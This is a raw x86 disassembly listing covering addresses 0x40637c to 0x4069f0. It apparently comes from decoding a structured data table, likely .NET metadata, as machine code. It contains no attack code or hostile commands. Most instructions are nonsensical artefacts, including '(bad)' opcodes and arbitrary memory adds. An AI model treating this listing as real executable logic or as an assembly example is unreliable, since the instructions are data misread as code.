  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 a3 02 94 00 10    	add    %ah,0x10009402(%ebx)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 cc                	add    %cl,%ah
  40638d:	04 58                	add    $0x58,%al
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 8d 19 9a    	add    %dl,-0x65e67300(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 04 0d 9a    	add    %dl,-0x65f2fc00(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 0b 15 0a    	add    %dl,0xa150b18(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 11                	add    %dl,(%ecx)
  4063c5:	0f 0a                	(bad)
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	05 15 0e 00 14       	add    $0x14000e15,%eax
  4063d7:	00 41 21             	add    %al,0x21(%ecx)
  4063da:	00 00                	add    %al,(%eax)
  4063dc:	00 00                	add    %al,(%eax)
  4063de:	96                   	xchg   %eax,%esi
  4063df:	00 43 17             	add    %al,0x17(%ebx)
  4063e2:	0a 00                	or     (%eax),%al
  4063e4:	14 00                	adc    $0x0,%al
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 60 0e 1d    	add    %dl,0x1d0e6000(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 66 02 1d    	add    %dl,0x1d026600(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 4f 14 1d    	add    %dl,0x1d144f00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 eb                	add    %ch,%bl
  406419:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 8d 05 1d 00 14    	add    %cl,0x14001d05(%ebp)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	05 15 0e 00 14       	add    $0x14000e15,%eax
  406439:	00 6c 36 00          	add    %ch,0x0(%esi,%esi,1)
  40643d:	00 00                	add    %al,(%eax)
  40643f:	00 96 00 ef 01 c3    	add    %dl,-0x3cfe1100(%esi)
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 33                	add    %dh,(%ebx)
  406451:	0d c7 00 14 00       	or     $0x1400c7,%eax
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 18                	add    %bl,(%eax)
  40645f:	12 53 00             	adc    0x0(%ebx),%dl
  406462:	15 00 7b 21 00       	adc    $0x217b00,%eax
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 db 10 1d    	add    %dl,0x1d10db00(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 eb 19 0a    	add    %dl,0xa19eb00(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 b7 18 c3    	add    %dl,-0x3ce74900(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 87 13 d5    	add    %dl,-0x2aec7900(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 7d 12 0a    	add    %dl,0xa127d00(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 95 06 c3    	add    %dl,-0x3cf96b00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 3c 1c 1d    	add    %dl,0x1d1c3c00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 31 1c 0a    	add    %dl,0xa1c3100(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 04    	add    %al,0x4209600(%eax)
  4064dd:	1c e0                	sbb    $0xe0,%al
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 ef    	add    %al,-0x10df6a00(%eax)
  4064eb:	1b e4                	sbb    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 ee    	add    %al,-0x11df6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 05 1b f1 00 1a    	and    %al,0x1a00f11b
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 c2    	add    %al,-0x3ddf6a00(%eax)
  406515:	08 f8                	or     %bh,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 82 0e ff 00 1d    	and    %al,0x1d00ff0e(%edx)
  406527:	00 ad 21 00 00 00    	add    %ch,0x21(%ebp)
  40652d:	00 96 00 cb 0b 1c    	add    %dl,0x1c0bcb00(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 6d 19 0a    	add    %dl,0xa196d00(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 f3                	add    %dh,%bl
  40654d:	19 0a                	sbb    %ecx,(%edx)
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 c0 0a 23    	add    %dl,0x230ac000(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 b7 0a 2a 01 24    	add    %dh,0x24012a0a(%edi)
  40656d:	00 cc                	add    %cl,%ah
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 a0 0a 84    	add    %dl,-0x7bf56000(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 b2 1c 1d    	add    %dl,0x1d1cb200(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 0b 15 0a    	add    %dl,0xa150b18(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 14 03 9a    	add    %dl,-0x65fcec00(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 9d 05 38 01 27    	add    %bl,0x27013805(%ebp)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 6a 03 0a    	add    %dl,0xa036a00(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 a1 14 3e    	add    %dl,0x3e14a100(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 0b                	sbb    %cl,(%ebx)
  4065d9:	15 0a 00 29 00       	adc    $0x29000a,%eax
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	05 15 6b 01 29       	add    $0x29016b15,%eax
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	7c 1b                	jl     0x406611
  4065f6:	70 01                	jo     0x4065f9
  4065f8:	2a 00                	sub    (%eax),%al
  4065fa:	6c                   	insb   (%dx),%es:(%edi)
  4065fb:	41                   	inc    %ecx
  4065fc:	00 00                	add    %al,(%eax)
  4065fe:	00 00                	add    %al,(%eax)
  406600:	86 00                	xchg   %al,(%eax)
  406602:	7c 1b                	jl     0x40661f
  406604:	75 01                	jne    0x406607
  406606:	2b 00                	sub    (%eax),%eax
  406608:	6e                   	outsb  %ds:(%esi),(%dx)
  406609:	22 00                	and    (%eax),%al
  40660b:	00 00                	add    %al,(%eax)
  40660d:	00 86 00 74 1b 70    	add    %al,0x701b7400(%esi)
  406613:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 74 1b 75    	add    %al,0x751b7400(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 e7 0e 7c 01    	addl   $0x17c0ee7,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 0b 15 0a    	add    %dl,0xa150b18(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 1d 0d c7 00 30    	add    %bl,0x3000c70d
  40664d:	00 40 45             	add    %al,0x45(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 1d 0d 84 01 31    	add    %bl,0x3101840d
  40665b:	00 9f 22 00 00 00    	add    %bl,0x22(%edi)
  406661:	00 96 00 42 16 2a    	add    %dl,0x2a164200(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 b3 0c 93 01 33    	add    %dh,0x3301930c(%ebx)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 8d 0c 93    	add    %dl,-0x6cf37300(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 bd 0c 93 01 35    	add    %bh,0x3501930c(%ebp)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 89 16 84 01 36    	add    %cl,0x36018416(%ecx)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 c5 05 ab    	add    %dl,-0x54fa3b00(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	05 15 0e 00 3b       	add    $0x3b000e15,%eax
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 0b 15 0a    	add    %dl,0xa150b18(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 05 15 b1    	add    %al,-0x4eeafae8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 cf                	or     %ecx,%edi
  40670d:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 bb 1b bf 01 3c    	add    %edi,0x3c01bf1b(%ebx)
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	aa                   	stos   %al,%es:(%edi)
  406729:	19 0e                	sbb    %ecx,(%esi)
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 05 15 cb    	add    %al,-0x34eafae8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 2a 03 d7    	add    %al,-0x28fcd600(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 2a 03 dc    	add    %al,-0x23fcd600(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 2a 03 e2    	add    %al,-0x1dfcd600(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 2a 03 e8    	add    %al,-0x17fcd600(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 d5 0f ee    	add    %al,-0x11f02af8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	81 0d f4 01 42 00 e6 	orl    $0x23e6,0x4201f4
  406791:	23 00 00 
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 94 07 6b 01    	addl   $0x16b0794,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 ca 12 0e 00    	addl   $0xe12ca,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 25 03 d7 01    	addl   $0x1d70325,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 6d 0b 0a 02    	addl   $0x20a0b6d,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	14 19                	adc    $0x19,%al
  4067d2:	dc 01                	faddl  (%ecx)
  4067d4:	44                   	inc    %esp
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 a3 04 d7    	add    %al,-0x28fb5d00(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 b4 04 d7    	add    %al,-0x28fb4c00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 b9 04 d7    	add    %al,-0x28fb4700(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 74 12 0f 02    	addl   $0x20f1274,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 4e 1c 0f 02    	addl   $0x20f1c4e,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	de 13                	ficoms (%ebx)
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 b6 00 1f    	add    %al,0x1f00b600(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	d1 13                	rcll   $1,(%ebx)
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	fe                   	(bad)
  40685d:	18 27                	sbb    %ah,(%edi)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	ae                   	scas   %es:(%edi),%al
  40686b:	16                   	push   %ss
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	a3 16 31 02 4a       	mov    %eax,0x4a023116
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 2a 03 36    	add    %al,0x36032a00(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 2a                	add    %ch,(%edx)
  406895:	03 3c 02             	add    (%edx,%eax,1),%edi
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 93 16 42    	add    %al,0x42169300(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 69 06 42    	add    %al,0x42066900(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	34 19                	xor    $0x19,%al
  4068c0:	dc 01                	faddl  (%ecx)
  4068c2:	50                   	push   %eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 4f 0f 0e    	add    %al,0xe0f4f00(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a7 0c 6b    	add    %al,0x6b0ca700(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 9b 0c 47    	add    %al,0x470c9b00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 7f 10 4b    	add    %al,0x4b107f00(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	42                   	inc    %edx
  406905:	06                   	push   %es
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	09 19                	or     %ebx,(%ecx)
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	79 16                	jns    0x406938
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	5a                   	pop    %edx
  40692f:	06                   	push   %es
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	97                   	xchg   %eax,%edi
  40693d:	0f                   	(bad)
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	35 16 31 02 58       	xor    $0x58023116,%eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	66 0f                	(bad)
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	73 0c                	jae    0x406974
  406968:	47                   	inc    %edi
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	80 0c 6b 01          	orb    $0x1,(%ebx,%ebp,2)
  406978:	59                   	pop    %ecx
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	b5 13                	mov    $0x13,%ch
  406984:	23 02                	and    (%edx),%eax
  406986:	5a                   	pop    %edx
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	c3                   	ret
  406991:	13 15 02 5a 00 56    	adc    0x56005a02,%edx
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	e6 18                	out    %al,$0x18
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	f2 18 55 02          	repnz sbb %dl,0x2(%ebp)
  4069b0:	5b                   	pop    %ebx
  4069b1:	00 c0                	add    %al,%al
  4069b3:	54                   	push   %esp
  4069b4:	00 00                	add    %al,(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	86 08                	xchg   %cl,(%eax)
  4069ba:	7e 1c                	jle    0x4069d8
  4069bc:	5a                   	pop    %edx
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	fc                   	cld
  4069c9:	07                   	pop    %es
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	ce                   	into
  4069d7:	14 64                	adc    $0x64,%al
  4069d9:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	05 15 0e 00 5c       	add    $0x5c000e15,%eax
  4069e9:	00 20                	add    %ah,(%eax)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
